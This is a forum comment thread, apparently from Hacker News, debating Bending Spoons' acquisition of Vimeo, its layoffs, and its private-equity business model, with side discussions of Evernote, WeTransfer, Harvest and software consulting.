    &lt;p&gt;BendingSpoon CEO: "At Bending Spoons, we acquire companies with the expectation of owning and operating them indefinitely, and we look forward to realizing Vimeo’s full potential as we reach new heights together"&lt;/p&gt;
    &lt;p&gt;Vimeo CEO: "We are excited about this partnership, which we believe will unlock even greater focus for our team and customers as we continue to strive towards our global mission to be the most innovative and trusted video platform in the world for businesses"&lt;/p&gt;
    &lt;p&gt;Words no longer appear to mean things. While this isn't a surprise, it provides another data point that there can be no trust given to leaders words. I find it sad as it simply re-inforces this behaviour and normalises it.&lt;/p&gt;
    &lt;p&gt;After reading through the other comments about bending spoons and reading yours again: the bending spoons CEO is technically telling the truth! They intend to run the acquired companies forever. After cutting most of the staff, but he didn’t say that part of course.&lt;/p&gt;
    &lt;p&gt;I wouldn't even say it's "technically" the truth. It's just the truth. Nothing in the statement even comes close to implying that there wouldn't be layoffs. Hell, one of the quotes even mentions "focus", which if anything is a euphemism or hint for downsizing in these kinds of statements, not the opposite.&lt;/p&gt;
    &lt;p&gt;"excited about this partnership, which we believe will unlock even greater focus for our team and customers as we continue to strive towards our global mission to be the most innovative and trusted video platform in the world for businesses"&lt;/p&gt;
    &lt;p&gt;There's no hint of laying off all the staff here though. Now it sounds like they "were" excited to lay off people to maximize profits.&lt;/p&gt;
    &lt;p&gt;Maybe "unlock even greater focus for our team" means to unlock their focus to find other jobs but it's quite perverse. I agree with the OP, that "Words no longer appear to mean things"&lt;/p&gt;
    &lt;p&gt;very few people can do the mental gymnastics required to equate " we look forward to realizing Vimeo’s full potential as we reach new heights together " to "you're all getting fired."&lt;/p&gt;
    &lt;p&gt;at some point in the now far-distant past CEOs used to make heartfelt speeches and memos to a soon-to-be-downsized staff about how hard decisions had to be made and blah-blah-blah; now it's more about sequestering the decision makers away from the damaged goods while projecting daisies and sunshine for would-be investors.&lt;/p&gt;
    &lt;p&gt;The game has shifted far from the human factor into a purely financial/investor loop. Good for some people but generally worse for people .&lt;/p&gt;
    &lt;p&gt;And before I hear it : Yes it was always about money, but business wasn't always about investors . That projection of liability to a remote party is exactly the issue.&lt;/p&gt;
    &lt;p&gt;Obviously sometimes a business is unsustainable, and it's unavoidable, but it's pretty sociopathic to not consider that people are harmed by being laid off.&lt;/p&gt;
    &lt;p&gt;But even more, it seems like the statement implies layoffs if they are acquiring a startup or growth-orient company. Bending Spoon is saying they intend to run the web site/web app as-is and make money. That means they will discard employees who have been employed with hope of growing/pivoting/etc the company. In start-ups, that can be a lot of the employees.&lt;/p&gt;
    &lt;p&gt;Yes. It's a zero trust society. Nobody can trust anybody else. The only thing that's trusted is money in a bank account... And we really shouldn't be trusting our eyes there because the money is backed by nothing and there is no reliable consensus between different banks (see correspondant banking).&lt;/p&gt;
    &lt;p&gt;It's like; the thing we trust the most cannot be trusted but so long as we keep using money in its current form, we are devaluing the trust of everything else that's not money.&lt;/p&gt;
    &lt;p&gt;Imagine what would happen if we tried these actions like we do for real murder trials.&lt;/p&gt;
    &lt;p&gt;"CEO John Doe is found Guilty of maiming Company B to the point of bleeding it dry of its funds, resulting in bankruptsy. Due to person-hood laws, we sentence you to life in prison. Thank you for your attention on this matter."&lt;/p&gt;
    &lt;p&gt;Vimeo laid off most of their operation in Israel recently.[1] At least according to "www.calcalistech.com", which seems to be some minor news source in Israel. Their comment was that the office was damaged in a recent war. Rebuilding may not have been worth it.&lt;/p&gt;
    &lt;p&gt;I am surprised so many people don't understand the business model of Bending Spoons or are bewildered by it.&lt;/p&gt;
    &lt;p&gt;In conventional infrastructure and product development you need engineering staff to build the product; once the product is built you need very little engineering. If you build a house you don't keep the builders on payroll once it's built to keep "building" it - you may need maintenance staff but that's it - if you need to keep the full team of builders around then something is wrong and you may want to seek a refund for the original builders' fees since they did not actually finish building it.&lt;/p&gt;
    &lt;p&gt;Builders and electricians and tradesmen either work as contractors and take that into account (charging higher rates to compensate for the sporadic nature of the work) or work full-time for companies who then resell their services on building projects (charging accordingly to ensure there is enough revenue to pay a full-time payroll of said tradesmen).&lt;/p&gt;
    &lt;p&gt;Tech was an outlier in this case because ZIRP allowed companies to retain full engineering teams to keep "engineering" the product even once product-market-fit has been achieved and the product has been stabilized and finished. This gave a lot of engineers the illusion that perpetual "engineering" of a single product/service is a sustainable model and career.&lt;/p&gt;
    &lt;p&gt;Bending Spoons' business model is to buy finished products, cut off the deadweight and keep operating the product and actually making profit off the finished product, which was always a normal thing in every other industry.&lt;/p&gt;
    &lt;p&gt;For tech people that see themselves as builders, this should be normal and expected - they should charge competitive rates for their services taking into account the expectation that they're building something for someone else to make money off once it's built and that they won't be part of it once that's done (unless they want to negotiate an actual stake in the company). For tech people that don't, this is a difficult wake up call, but the earlier the better - the old situation was never sustainable to begin with.&lt;/p&gt;
    &lt;p&gt;I think a better analogy than building construction is cars. You need to do active maintenance and fix things on cars to keep them running, you may even change out a radio or wheels, etc. like minor feature development, but you're not likely to change out the design of the engine and transmission. You definitely don't need the design crew from the car manufacturer around, aka Product Mgmt, to do maintenance but you do need some semblance of a tech team or people that can do the tech work on contract.&lt;/p&gt;
    &lt;p&gt;At some point a tech product is "finished" as in a mature, stable product and adding new things to it isn't going to do 10x in revenue. Its probably really hard for the product and tech teams involved to admit though.&lt;/p&gt;
    &lt;p&gt;The economics are different because the industries are fundamentally different. Software is never "finished" the way a building is finished. More features can always be added to software. If those new features create new product lines and attract new revenue, then the software engineers' salaries are more than paying for themselves.&lt;/p&gt;
    &lt;p&gt;But, this obviously carries risk, that the new thing you develop won't be worth as much as you spent. Bending Spoons doesn't want risk, hence their decision.&lt;/p&gt;
    &lt;p&gt;Software may never be finished (in your opinion) but the budget of any customer is finite. If you keep reinvesting your revenue forever into "engineering" the product there's going to be a time where a competitor comes in with a finished product matching your customers' requirements and snatches him from you by both charging less and making a profit.&lt;/p&gt;
    &lt;p&gt;There’s also the much more common case of a competitor coming in with a similar product that has a few more features matching the customers’ requirements… which explains the endless product development treadmill that companies find themselves on.&lt;/p&gt;
    &lt;p&gt;Software doesn’t win by being “finished” it wins by out competing other software&lt;/p&gt;
    &lt;p&gt;Potential revenue growth is only as finite as your ideas (and ability to execute on them).&lt;/p&gt;
    &lt;p&gt;Just look at Google. They could have stopped writing new software at any point and been just fine. But in the long run they'd have missed out on trillions of dollars.&lt;/p&gt;
    &lt;p&gt;As with everything in business, it comes down to risk/reward. Not every risk pays off, but some do.&lt;/p&gt;
    &lt;p&gt;The businesses they acquire are ones whose revenue has not appreciably grown in many years. They are being sold because the prior owner does not believe they can improve the business any more.&lt;/p&gt;
    &lt;p&gt;Any profit bending spoons earns they can run off and invest in another business if they like. They don't bother investing in the businesses they purchase because they believe, like the previous owner believed, that there is no more juice to squeeze from that particular lemon.&lt;/p&gt;
    &lt;p&gt;I'm not really sure this argument makes sense. Plenty of software I've built is finished, it does the thing I need it to do and I haven't touched it in years. Adding features just because is not a useful way to spend anyone's time, doubly so in a business context.&lt;/p&gt;
    &lt;p&gt;It’s a mystery to me, almost every product on market has serious user-facing issues that never get fixed. As if every company indeed have no development team, while all of them retain teams of developers.&lt;/p&gt;
    &lt;p&gt;Exactly why I charge $999/hour for my software consulting. To the doubters, laugh all you want, but I've been doing this for literal decades, and will absolutely slaughter LLM generated code in terms of code reliability and maintainability amortized over 5 years.&lt;/p&gt;
    &lt;p&gt;Won't be giving exact figures but that's my business model as well - I charge a premium because my job for clients is to make myself obsolete. If I "deliver" something that needs my constant presence then I haven't actually delivered. Of course, my price is high upfront because I'm budgeting in the fact that I strive to be out of there as soon as feasible instead of trying to stick around.&lt;/p&gt;
    &lt;p&gt;Some clients are ok with it, some don't; this is normal and what a competitive market should look like. I tell clients openly when my premium service is not the right fit for their current requirements or budget, and there are cases where cheaper labor or LLMs are absolutely a better fit (and they should come back once when/if they outgrow the cheaper, lower-quality product).&lt;/p&gt;
    &lt;p&gt;Have you tried Claude Opus 4.5 within Claude Code?&lt;/p&gt;
    &lt;p&gt;it's only been released for two months but its changed the calculus entirely&lt;/p&gt;
    &lt;p&gt;if its been over two months since you've tried any LLM generated code solution, or are still occasionally copy pasting code requirements into a browser chat session as if its still 2023, then I can't put any weight into the opinion&lt;/p&gt;
    &lt;p&gt;Hourly rates are inherently risky for clients - you're asking them to part with money with no guaranteed outcome, so there's a natural ceiling where the financial risk becomes untenable regardless of your expertise and reputation.&lt;/p&gt;
    &lt;p&gt;Clients don't buy hours though, they buy solutions. They have problems costing them money or preventing revenue and they'll pay a percentage of that value to solve it. When you price based on solution value rather than time, your effective hourly rate merely becomes a function of your efficiency and expertise delivering said solution.&lt;/p&gt;
    &lt;p&gt;They key to achieving such a rate comes down to your sales and business skills: understanding what to sell, how to structure it to maximize your earnings and make it palatable for the client.&lt;/p&gt;
    &lt;p&gt;For example I generally avoid hourly billing except as a filter for time-wasters. Instead, consultancy becomes a loss leader for the real business: deeply understanding client problems and delivering high-value solutions. Clients happily pay premium rates when they see the price as a fraction of the solution's worth to them.&lt;/p&gt;
    &lt;p&gt;I only resort to quoting (quite high) hourly rates where it's clear the client just wants consultancy/advice (basically a glorified IT/business support) as a way to make it worth my time and gently encouraging them to bounce (I openly suggest more cost-effective options and refer them there).&lt;/p&gt;
    &lt;p&gt;I'd love to do this and have a quite marketable resume, but it is extremely, extremely, unclear to me how you build a clientele or where you'd even start.&lt;/p&gt;
    &lt;p&gt;Only road I can imagine is highly specialized industry, with money, that often has time-sensitive needs, and smart management that knows how to recognize value or trusts their tech management. And even then I think you'd have to start in the coal-mines version of it, $50K/year flat salary, and building a reputation without management taking credit for your successes, somehow.&lt;/p&gt;
    &lt;p&gt;Once you have them on the phone, you can not only better understand their problem but also demonstrate your skill and credibility in a way no resume or branding could.&lt;/p&gt;
    &lt;p&gt;At that point it's just a sales game - generally you'd avoid hourly rates and sell them a solution (see my other comment) which will maximize your effective hourly rate while being structured in a way that's very good value for the client. Hourly should be a last resort, at which point generally you'd rather have the client bounce, so you quote a high rate.&lt;/p&gt;
    &lt;p&gt;I'll offer a specific solution that takes me a week of full time work (14 hours each day -- I'm focused) for about $10k, which is roughly $150/hour if you want to calculate it that way, or another specific solution that takes me 3 weeks of 10 hour days for $15k which amounts to $100/hour. And like any good consultant, I'll eat the cost if I'm wrong. Other times I'll charge $40k when I know it will take a few months of dedicated work and I have to really lock in.&lt;/p&gt;
    &lt;p&gt;In practice, I never actually charge hourly. So the $999/hour is really Schrodinger's rate.&lt;/p&gt;
    &lt;p&gt;The fact that it's the norm for the builders of mature software to stick around can lead to some gross engineering inefficiencies. For instance, a lot of Evernote's backend infrastructure was manually managed [0]:&lt;/p&gt;
    &lt;p&gt;With Evernote, Bending Spoons identified that the backend needed a complete rewrite. They moved from a monolithic architecture running on manually provisioned virtual machines to a microservices architecture with managed databases, significantly improving performance and scalability.&lt;/p&gt;
    &lt;p&gt;It's easy for companies to fall into such pits of inefficiency because climbing out of those pits entails utterly gutting the headcount [*].&lt;/p&gt;
    &lt;p&gt;I wonder if the same is true at Vimeo, which employed ~250 engineers [1], which seems high for a mature product that's deliberately conservative (most of Vimeo's customers are B2B whitelabelers, for whom a constantly changing product is a massive downside.) It's not like video codecs or storage systems or web standards are changing daily. I would imagine a well-engineered codebase from 10 years ago would work well today with only minimal changes, mostly centered around updating libraries for security patches. The fact that they had 250 engineers on staff who presumably did more than play ping-pong all day makes me wonder if the codebase was not, in fact, well-engineered.&lt;/p&gt;
    &lt;p&gt;[*] Imagine the equivalent for a building: "we don't have automatic circuit breakers in this building; instead, we have a 24 hour staff of electricians who measure current with an ammeter and manually cut the power if it gets too high."&lt;/p&gt;
    &lt;p&gt;&amp;gt; With Evernote, Bending Spoons identified that the backend needed a complete rewrite. They moved from a monolithic architecture running on manually provisioned virtual machines to a microservices architecture with managed databases, significantly improving performance and scalability.&lt;/p&gt;
    &lt;p&gt;And accidentally turned it into a shitty product in the process :-)&lt;/p&gt;
    &lt;p&gt;If you build a house you don't keep the builders on payroll once it's built to keep "building" it - you may need maintenance staff but that's it&lt;/p&gt;
    &lt;p&gt;A very analytical, technological, short-sighted view of things. But not necessarily how the customers think.&lt;/p&gt;
    &lt;p&gt;For many customers, a company that isn't growing is shrinking. If a company isn't willing to invest in growth, that's a red flag.&lt;/p&gt;
    &lt;p&gt;I mentioned the Vimeo thing in a meeting this morning, and the head of Communications immediately said he's going to start looking for alternatives.&lt;/p&gt;
    &lt;p&gt;You can make all the analogies and excuses you like, but look at Vimeo's sister properties (Evernote, etc.) Are they better off since they were gutted? Are they delivering more value to the customers, or just funneling money to the parent company and its investors?&lt;/p&gt;
    &lt;p&gt;I think a better analogy is some big Wall Street investment company buying up nursing homes, and making lots of noises about "efficiency." That never works out well for the patients/customers. Only for the company.&lt;/p&gt;
    &lt;p&gt;I don't think you need ZIRP or even VC to have successful software companies that reinvest in features. You need a low marginal cost of manufacturing, aka the floppy disk.&lt;/p&gt;
    &lt;p&gt;I put it to not-tech people as: "[insert_ridiculous_valuation] is because you can fire everyone tomorrow and keep operating"&lt;/p&gt;
    &lt;p&gt;&amp;gt; "Tech was an outlier in this case because ZIRP allowed companies to retain full engineering teams to keep "engineering" the product despite it being essentially finished."&lt;/p&gt;
    &lt;p&gt;This is wrong, though, it's unnecessarily tying in a pop-finance obsession with ZIRP.&lt;/p&gt;
    &lt;p&gt;Unnecessary is the right word because it's not necessary for the rest of your post, you could cut it out and it wouldn't affect your argument or anyone's understanding.&lt;/p&gt;
    &lt;p&gt;Wrong is the right word because the dynamics it assumes are fantastical - companies took on debt to fund bloated engineering teams because no one noticed the engineering was done?&lt;/p&gt;
    &lt;p&gt;Additionally, ZIRP didn't induce this, this stuff happened, exactly the same, during ZIRP as well. Saw it in the iPad point of sale industry in early to mid 2010s.&lt;/p&gt;
    &lt;p&gt;A real finance nerd would point out ZIRP would in fact induce more of this behavior. It makes it cheaper for private equity/entities like Bending Spoons to take on debt to buy out companies and strip mine them. (strip mine being my word for this behavior)&lt;/p&gt;
    &lt;p&gt;&amp;gt; companies took on debt to fund bloated engineering teams because no one noticed the engineering was done&lt;/p&gt;
    &lt;p&gt;ZIRP allowed a lot of "businesses" to exist that wouldn't in a conventional, competitive capitalistic environment. Businesses in quotes because there was never any reasonable potential for profitability, but it didn't matter because VC money was cheap. Building a sustainable business is hard, playing "startup founder" and having that lifestyle subsidized by VCs is easier.&lt;/p&gt;
    &lt;p&gt;In that case, (over)engineering was part of the performance art that was required to keep your only revenue source: the next funding round. There was never any incentive to "finish" the product because doing that would put your business model (or lack thereof) to the test and stop the music. On the other hand, as long as cheap money is around you could endlessly "engineer" and pivot and bullshit around, chasing the next funding round and using that to pay yourself/your friends decent salaries.&lt;/p&gt;
    &lt;p&gt;During the ZIRP era it was all about "engagement" and DAUs/MAUs, then it was blockchain, and now it's all about AI. For those that have run out of grifts, they fold or "incredible journey" and get sold for pennies on the dollar to entities like Bending Spoons that do notice there are bloated engineering teams that can be cut.&lt;/p&gt;
    &lt;p&gt;You hold ZIRP caused this, then cite crypto and AI as continuations, both post-ZIRP. Which is it?&lt;/p&gt;
    &lt;p&gt;&amp;gt; as long as cheap money is around you could endlessly "engineer" and pivot and bullshit around&lt;/p&gt;
    &lt;p&gt;I lived this in a particular industry firmly inside the ZIRP era. It doesn't begin to describe how things actually worked. Even if ZIRP is synonymous with endless money to you, on their end, they still had to choose how to allocate it, and it was finite. You're not going to a bank for a loan, you beg people with experience in software to believe you're trending up.&lt;/p&gt;
    &lt;p&gt;&amp;gt; During the ZIRP era it was all about "engagement" and DAUs/MAUs, then it was blockchain, and now it's all about AI.&lt;/p&gt;
    &lt;p&gt;Do you genuinely believe DAUs/MAUs stopped mattering once crpyto, then AI, arrived?&lt;/p&gt;
    &lt;p&gt;Your argument requires believing that engineers collectively ran a con that no investor, board member, or executive noticed for a decade, and the only people who figured it out were PE firms after 2022. That's conspiracy theory dressed in finance vocabulary.&lt;/p&gt;
    &lt;p&gt;The leveraged buyout model you're praising as "normal capitalism" is itself subsidized by cheap debt. You've correctly identified that cheap money distorts incentives. You've just misidentified which side of the transaction is the distortion.&lt;/p&gt;
    &lt;p&gt;ZIRP was the era of where any tech startup was seen as a good investment no matter how stupid. Take any stupid business that doesn't work, say you do it with tech, get millions thrown at you. Then it was blockchain - same story, conventional business that doesn't work, but with blockchain - boom, instant money. Now the same with AI.&lt;/p&gt;
    &lt;p&gt;&amp;gt; you beg people with experience in software to believe you're trending up&lt;/p&gt;
    &lt;p&gt;Considering how much stupid shit I've seen funded (that quietly "incredible journey'd" away or folded by now) I don't think much begging was involved. Capital was desperate to find a place, no matter how ill-advised. Everyone in the startup food chain enjoyed it.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Do you genuinely believe DAUs/MAUs stopped mattering once crpyto, then AI, arrived?&lt;/p&gt;
    &lt;p&gt;What started mattering is a clear path to monetize said DAUs/MAUs. You can't just show up with (potentially flawed) analytics saying you have DAUs and you're gonna figure out monetization later. Now you need to actually figure it out now and show up with analytics + proof of actually monetizing those users. Well, except if you're selling AI - then it's ok to sell inference at a major loss and figure out monetization later.&lt;/p&gt;
    &lt;p&gt;&amp;gt; collectively ran a con that no investor, board member, or executive noticed for a decade&lt;/p&gt;
    &lt;p&gt;"Investing" in a Ponzi can still be profitable as long as you get out before it collapses. There was a lot of passing around the hot potatoes between VCs too, so a VC can rightfully determine something to be a scam, but still invest if they believe SoftBank will happily hold the bag (and those guys ended up taking a lot of bags).&lt;/p&gt;
    &lt;p&gt;&amp;gt; "except if you're selling AI - then it's ok to sell inference at a major loss and figure out monetization later"&lt;/p&gt;
    &lt;p&gt;So the dynamic you attributed to ZIRP is alive and well, just wearing different clothes. Your original framework was "ZIRP allowed this, now real capitalism is correcting it." Now it's "this is permanent, it just rotates themes." These are different arguments.&lt;/p&gt;
    &lt;p&gt;&amp;gt; "Investing in a Ponzi can still be profitable as long as you get out before it collapses... a VC can rightfully determine something to be a scam, but still invest"&lt;/p&gt;
    &lt;p&gt;You've just moved the con from engineers to VCs. If investors knowingly played hot potato, then engineers weren't running a grift, they were employees doing jobs while capital played musical chairs above their heads.&lt;/p&gt;
    &lt;p&gt;So which is it: were engineers "deadweight" padding out finished products, or were they ordinary workers caught in a game VCs were knowingly playing? Because "VCs knew it was a scam but invested anyway" is a very different story than "engineers tricked everyone into thinking the product wasn't finished."&lt;/p&gt;
    &lt;p&gt;You're retreating into "everyone knew it was fake."&lt;/p&gt;
    &lt;p&gt;&amp;gt; Bending Spoons has a pattern of acquiring companies, then laying off staff and cutting features. For example, Bending Spoons acquired note-taking and task management app Evernote in 2022, after which the company laid off most of its U.S. and Chile staff and moved operations to Europe in 2023. Evernote then shut down the Linux and older legacy versions of the app, and then proceeded to place heavy restrictions on the app’s free tier in 2024.&lt;/p&gt;
    &lt;p&gt;&amp;gt; In another example, Bending Spoons acquired WeTransfer in July 2024 and then laid off 75% of its staff a few weeks after. A couple months later, WeTransfer began limiting free users to 10 transfers per month.&lt;/p&gt;
    &lt;p&gt;I don't understand this model. Such significant layoffs would indicate that there is no real appetite for expansion or growth.&lt;/p&gt;
    &lt;p&gt;Their goal might be be to acquire, dramatically cut costs, and then run the product for as long as they can at a profit before breaking it down and selling it off (or hope for a buyout by a bigger player.) But that wouldn't make sense — customers of a depreciating SaaS product surely churn after a 1-3 years, so they wouldn't make enough of a return from their existing customers to justify the investment...&lt;/p&gt;
    &lt;p&gt;Yeah this is what I think Bending Spoons does, mostly based on the Evernote situation.&lt;/p&gt;
    &lt;p&gt;Product has paying users and it's in a "complete" state. Cut costs to optimize profit for a bit and hope not everyone leaves.&lt;/p&gt;
    &lt;p&gt;In the case of Evernote, it's probably really hard to get 10 year users off of it at this point, so they can double subscriptions and they're locked in. My assumption is that there's a serious amount of people that go "eh" and just deal with the cost increase and stagnated features.&lt;/p&gt;
    &lt;p&gt;It was like that with WeTransfer too. Fine company that had been profitable for years, but with little hope of getting ever 10x bigger again. I used to work there and had already left by the time of the acquisition, but all the old colleagues I've spoken to said the same.&lt;/p&gt;
    &lt;p&gt;The main business was throwing off gobs of money and there were SO MANY failed projects to try and find new revenue streams. Everyone who was not being pushed by the PE owners could see that they would never account to even 1% of the revenues of the main product. It was only a matter of time before someone came in, said "the main business is fine as is" and fired the people who were involved in the moonshots then sat back and raked in the cash. Sure, it will probably not last forever. But if it brings in millions per year for 15-20 years until the company dies, then that is probably an outcome Bending Spoons is fine with.&lt;/p&gt;
    &lt;p&gt;For a hosting space like Vimeo, I'd be surprised if this gave them 5 years. And remember, they acquired Vimeo for over a billion dollars.&lt;/p&gt;
    &lt;p&gt;This isn't like some B2C 5-10 dollar a month service. Video hosting is notoriously expensive and paying clients will quickly see other alternatives if they see smoke. These are already people with specialized needs that the main market leader (Youtube) cannot fulfill. They are "active", so to speak.&lt;/p&gt;
    &lt;p&gt;&amp;gt; These are already people with specialized needs that the main market leader (Youtube) cannot fulfill.&lt;/p&gt;
    &lt;p&gt;Isn't this just a bigger reason why these people won't leave? Assuming the acquirer isn't dumb enough to remove the core benefit that comes from their highest paying customers, they will keep providing those, and those customers won't churn. And I think this is a safe assumption, considering it's the primary goal and focus of the people at the acquirer.&lt;/p&gt;
    &lt;p&gt;And honestly this is probably fine. If the main business can't grow and there have been a few years of attempts to produce complementary businesses with no success, that's a good sign that the business should be moved into a "return money to owners" model.&lt;/p&gt;
    &lt;p&gt;Sadly, "return money to owners" ends more like the owner selling off the company and leaving all the workers under them in freefall. And people wonder why loyalty is dead.&lt;/p&gt;
    &lt;p&gt;The owner got a big pay package from the sale on top of usually being one of the more highly compensated employees at such companies. What do you mean by "the owner didn't get paid"?&lt;/p&gt;
    &lt;p&gt;&amp;gt;No one wonders why loyalty is dead.&lt;/p&gt;
    &lt;p&gt;I see you missed the recent narrative of "Gen Z is lazy" and "most managers avoid hiring Gen Z" out there. I assure you many managers are baffled, bit blame the (relative) children instead of seeing how work culture has shifted since they were that age&lt;/p&gt;
    &lt;p&gt;This is correct. You're buying a cashflow. Bending Spoons has optimized their model for very specific types of cashflow enterprises to aggregate into their portfolio.&lt;/p&gt;
    &lt;p&gt;I use Harvest to track hours and expenses and to invoice my customers. Bending Spoons apparently bought them a while ago and just eliminated the shell company around Harvest.&lt;/p&gt;
    &lt;p&gt;Based on my experience with Evernote, I don't trust Bending Spoons, and I'm wondering if I should look for a different time-tracking and invoicing system.&lt;/p&gt;
    &lt;p&gt;I've been in the same boat as you and replaced it last year but still pay for harvest (grandfathered pricing) until I can be sure I don't need it. I'm almost up to renewal and haven't used it at all since trying app.solidtime.io&lt;/p&gt;
    &lt;p&gt;I'll be honest it's not as good as harvest. The mac app is a bit buggy, it's not as easy to add manual time, and you need to pay for pdf export. But having said that I've found the free version to cover 90% of my use of the paid version of harvest&lt;/p&gt;
    &lt;p&gt;I use Harvest for my freelance invoicing and started seeing the huge notice at the top of the app and was wondering how this was going to impact my stuff going forward. I'm also very leery having gone through a horrible Evernote experience.&lt;/p&gt;
    &lt;p&gt;If anybody has any good alternatives, I'm all ears.&lt;/p&gt;
    &lt;p&gt;Been a paiyng Evernote customer since its launch. I unsubscribed at the beginning of 2025 after 7/8 years of shitty releases, not fixing old bugs, and new useless features.&lt;/p&gt;
    &lt;p&gt;I don't user Evernote very often, but I have a bunch of stuff stored in there and use it basically in a read-only mode. For a long time I was able to get the $36 / year plan which I felt pretty good about. It was a great app and service which I didn't use very much, so that felt like a fair price and I felt good about supporting them at that level. Basically every time I opened Evernote, I was paying $2.&lt;/p&gt;
    &lt;p&gt;But then the price tripled and for me, it's too much. I'll pay $2 per session, but not $5.&lt;/p&gt;
    &lt;p&gt;I remember their CEO (Phil Libin I think) on their podcast explaining how they were building a 100 year company. I really wanted to believe that.&lt;/p&gt;
    &lt;p&gt;I use Obsidian now and like it, but it feels like they are going down the same path. They keep adding features that don't really fit the original editor-for-a-folder-of-markdown-files. I wish they would stop.&lt;/p&gt;
    &lt;p&gt;It's a bummer but the feature treadmill seems inescapable. Bending Spoons will probably be able to buy Obsidian for a very nice price in a few years and the Obsidian founders will do very well.&lt;/p&gt;
    &lt;p&gt;If everyone gets salaries and equity is paid for then everyone's done great. And then we can build another one, or an open source equivalent once all the money's been spent researching useful features, and then we're done.&lt;/p&gt;
    &lt;p&gt;It's worse. When a company like this is "mature", they don't try to appeal to new users. They instead squeeze what they can out of the existing user base, because that user base is probably already dying off. This isn't about attaining a steady state business, its about seeing how much of the toothpaste you can still squeeze out the bottle before it crusts up.&lt;/p&gt;
    &lt;p&gt;This practice is derogatorily called "vulture capitalism" for a reason. I hope the remaining engineers are either lining up for retirement or networking around for their next gig.&lt;/p&gt;
    &lt;p&gt;&amp;gt; I don't understand this model. Such significant layoffs would indicate that there is no real appetite for expansion or growth.&lt;/p&gt;
    &lt;p&gt;To play devil's advocate, maybe there's a point where a product or service needs to stop evolving and just be.&lt;/p&gt;
    &lt;p&gt;I have a Vimeo account that's been on auto-resubscribe for years. I couldn't tell you a single feature they've added in the last 5 years, but they host my videos, collect stats, and let me send links to my friends, and that's really all I want.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Their goal might be be to acquire, dramatically cut costs, and then run the product for as long as they can at a profit before breaking it down and selling it off&lt;/p&gt;
    &lt;p&gt;In the 80's people who did this were known as "corperate raiders". Nowadays it's just called business.&lt;/p&gt;
    &lt;p&gt;Vimeo employed somewhere north of a thousand people a year ago with 28% being in the engineering team (according to random google results - this isn't an area I have personal knowledge of). If they dropped from around 300 people to 15 that sounds like gutting - not trimming.&lt;/p&gt;
    &lt;p&gt;They will be hiring up but not the same people. Bending Spoons tends to replace high silicon valley wages with high Italy wages which is a considerable saving.&lt;/p&gt;
    &lt;p&gt;This is why I can't take any anti-immigration sentiments seriously in this country. An american founded company runs a business for 20 years, sells it off overseas, and the new owners kick all Americans out of the equation.&lt;/p&gt;
    &lt;p&gt;Response from America: "well that's just business, I guess". It was never about preserving American labor.&lt;/p&gt;
    &lt;p&gt;It sounds like they're trying to extract as much money as possible from a SaaS subscription service that's no longer actually paying any devs.&lt;/p&gt;
    &lt;p&gt;From my perspective as a one-time (but no longer) paying user of evernote - WTF am I paying for monthly if not to support a dev team?&lt;/p&gt;
    &lt;p&gt;Seriously - I get that there are infra costs for some of the services, and I wouldn't mind paying those costs plus a reasonable upcharge, but I'm sure as fuck not going to pay a company $100+ a year subscription to store under a GB of data.&lt;/p&gt;
    &lt;p&gt;So now I host bookstack and I pay backblaze ~$0.22/m to back up all my notes, which is much closer to real costs for these services if they're not under development.&lt;/p&gt;
    &lt;p&gt;Genuine question, why not use a free Git service or something&lt;/p&gt;
    &lt;p&gt;I pay for Sourcehut now, but until recently I was using a free private GitHub account to sync my notes in Obsidian. It works fine and cost me nothing (at least nominally).&lt;/p&gt;
    &lt;p&gt;Corporate raiders is a bit of a different concept. That implies a hostile takeover. Like aggressively buying up shares in order acquire a majority stake and set company policy against the wishes of other insiders.&lt;/p&gt;
    &lt;p&gt;Bending Spoons is what we'd call vulture capitalists which have and continue to exist. Basically they buy weakening businesses and carve them up for parts, selling anything of value and squeezing max revenue of whatever is left.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Basically they buy weakening businesses and carve them up for parts, selling anything of value and squeezing max revenue of whatever is left.&lt;/p&gt;
    &lt;p&gt;People say this like it's a bad thing, but without "vulture capitalists", struggling companies would default and banks would attempt to do the same, except they are much worse at it and even more people would lose their jobs.&lt;/p&gt;
    &lt;p&gt;Comments like the above one refer to community vibes, the types of comments that will get you lots of praise/upvotes.&lt;/p&gt;
    &lt;p&gt;So while individuals have different beliefs, the "average expected top comment" for communities like HN is usually pretty predictable, and hence the cognitive dissonance of the community on the whole can be called out.&lt;/p&gt;
    &lt;p&gt;If your comment is referring to the bending spoons business model, it's worth pointing out they are not VC, they are private equity.&lt;/p&gt;
    &lt;p&gt;If your comment is referring to the software company's exiting to provide a return to shareholders, that happens all the time whether it's venture-backed or privately owned. The owners of privately held bootstrapped companies still want an exit one day too.&lt;/p&gt;
    &lt;p&gt;As an open source software engineer who is now a venture capital investor, respectfully, I think your beef is with capitalism, not with the institutional investors.&lt;/p&gt;
    &lt;p&gt;Not in the startup world beyond what I pick up on HN, but this distinction was helpful. My mental model going forward: - If a company is still validating the business model and optimizing for rapid growth, it’s typically a Venture Capitalist (VC) fit. - If a company is already established and the play is to improve operations, scale, or restructure (often involving a change of control), it’s typically a Private Equity (PE) fit.&lt;/p&gt;
    &lt;p&gt;Reminder that restructure often means a company working just fine, but whose assets outstrip what PE can buy it for, so they strip it to the bones. Or they leverage it with debt against assets then pay that money to themselves for consulting, account/hr services that they force the company to outsource to other PE companies. Nothing is 'created' through this process, now value added, nor it is healthy capitalism as the company could have continued fine without this added leveraged debt that was purely used to profit PE.&lt;/p&gt;
    &lt;p&gt;The Bending Spoons business model is right out of the private equity playbook. Buy a business with good revenue, cut cost to turn this into a consistent revenue stream, generate annual returns.&lt;/p&gt;
    &lt;p&gt;This is not like making a small 20 person self funded company.&lt;/p&gt;
    &lt;p&gt;There are now more private equity funds in the USA than McDonalds. The maximum wealth extraction of every single thing in people's lives is not viable for a continuing healthy society.&lt;/p&gt;
    &lt;p&gt;What's hard to understand? They switch the companies from growth (no matter the cost) to revenue extraction (even if it will eventually fade)&lt;/p&gt;
    &lt;p&gt;Minimum viable cost of keeping the lights on. And sometimes they even compromise a little, "let's spend a tiny bit more and see how much growth we can get from that"&lt;/p&gt;
    &lt;p&gt;It's called butt cigar investing or corporate raiding.&lt;/p&gt;
    &lt;p&gt;They acquire startups and companies without a huge growth potential but modest cash flow and little profits.&lt;/p&gt;
    &lt;p&gt;They cut the operating expenses to the minimum and jack up the prices to sky rocket profits till their mathematical models will tell them they will profit on the investment.&lt;/p&gt;
